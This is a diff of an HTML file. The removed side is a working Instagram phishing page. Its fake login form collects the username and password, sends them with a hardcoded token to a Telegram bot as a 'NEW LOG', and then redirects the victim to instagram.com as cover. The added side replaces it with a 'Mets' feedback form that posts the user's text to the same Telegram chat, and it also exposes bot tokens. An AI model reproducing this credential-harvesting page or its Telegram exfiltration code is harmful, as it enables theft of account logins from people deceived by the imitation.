@@ -1,64 +1,161 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход • Instagram</title>
-    <style>
-        /* Дизайн максимально под Инстаграм */
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
-        .logo { font-size: 35px; font-weight: bold; margin-bottom: 40px; font-style: italic; }
-        input { width: 100%; padding: 12px; background: #121212; border: 1px solid #363636; border-radius: 3px; color: #fff; margin-bottom: 12px; outline: none; font-size: 14px; }
-        input:focus { border-color: #555; }
-        button { width: 100%; padding: 10px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; cursor: pointer; font-size: 14px; }
-        .footer { position: absolute; bottom: 20px; color: #8e8e8e; font-size: 12px; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mets • Опрос</title>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,sans-serif;
+}
+
+body{
+    background:#000;
+    color:#fff;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    padding:20px;
+}
+
+.container{
+    width:100%;
+    max-width:360px;
+    background:#111;
+    border-radius:20px;
+    padding:25px;
+    text-align:center;
+}
+
+.logo{
+    font-size:30px;
+    font-weight:bold;
+    margin-bottom:25px;
+}
+
+.question{
+    font-size:18px;
+    margin-bottom:20px;
+}
+
+textarea{
+    width:100%;
+    height:120px;
+    background:#1c1c1c;
+    border:1px solid #333;
+    border-radius:12px;
+    padding:12px;
+    color:white;
+    resize:none;
+    outline:none;
+    margin-bottom:15px;
+}
+
+button{
+    width:100%;
+    background:#0064e0;
+    color:white;
+    border:none;
+    border-radius:25px;
+    padding:14px;
+    font-size:16px;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+button:hover{
+    opacity:0.9;
+}
+
+</style>
 </head>
+
 <body>
 
-    <div class="login-box">
-        <div class="logo">Instagram</div>
-        
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Телефон, имя пользователя или email" required>
-            <input type="password" id="password" placeholder="Пароль" required>
-            <button type="submit">Войти</button>
-        </form>
+<div class="container">
+
+    <div class="logo">Mets</div>
+
+    <div class="question">
+        Вам нравится сайт?
     </div>
 
-    <div class="footer">Meta © 2024</div>
+    <form id="surveyForm">
 
-    <script>
-        const form = document.getElementById('loginForm');
-        
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
+        <textarea
+            id="message"
+            placeholder="Напишите ваш отзыв..."
+            required
+        ></textarea>
 
-            // Твои проверенные данные
-            const token = '8314828218:AAGcMhdPg7GEDW4e1EPAlp-qJt5FkMXwlmY';
-            const chat_id = '6576262467';
-            
-            const u = document.getElementById('username').value;
-            const p = document.getElementById('password').value;
-            
-            const text = `📸 NEW LOG:\n👤 Логин: ${u}\n🔑 Пароль: ${p}`;
+        <button type="submit">
+            Отправить
+        </button>
 
-            // Отправка данных
-            try {
-                await fetch(`https://telegram.org{token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chat_id, text: text })
-                });
-            } catch (err) {
-                console.log('Ошибка отправки');
+    </form>
+
+</div>
+
+<script>
+
+document.getElementById('surveyForm').onsubmit = async function(e){
+
+    e.preventDefault();
+
+    const text = document.getElementById('message').value;
+
+    const BOT_TOKEN = '8314828218:AAGY6twUZ6iFU7smncNhgGJ7pxh5z6MF1p8';
+    const CHAT_ID = '6576262467';
+
+    try{
+
+        const response = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            {
+                method:'POST',
+                headers:{
+                    'Content-Type':'application/json'
+                },
+                body:JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: '📩 Новый отзыв:\n\n' + text
+                })
             }
+        );
 
-            // Маскировка: перенаправление
-            window.location.href = 'https://instagram.com';
-        });
-    </script>
+        const data = await response.json();
+
+        if(data.ok){
+
+            alert('Спасибо за отзыв ❤️');
+
+            document.getElementById('message').value = '';
+
+        }else{
+
+            alert('Ошибка Telegram');
+
+            console.log(data);
+
+        }
+
+    }catch(err){
+
+        console.log(err);
+
+        alert('Ошибка отправки');
+
+    }
+
+}
+
+</script>
 
 </body>
 </html>
